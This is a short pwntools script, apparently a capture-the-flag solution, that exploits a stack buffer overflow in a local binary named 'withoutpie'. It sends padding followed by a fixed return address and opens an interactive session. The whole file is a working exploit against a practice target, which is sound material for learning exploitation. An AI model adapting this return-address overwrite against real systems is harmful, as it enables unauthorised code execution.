# coding: utf-8
from pwn import*
def chall02():
    p = process("./withoutpie")
    print(p.recv())
    payload = (b"a"*0x71 + b"a"*0x4 + p32(0x08049182))
    p.sendline(payload)
    p.interactive()
    p.close()
    
chall02()
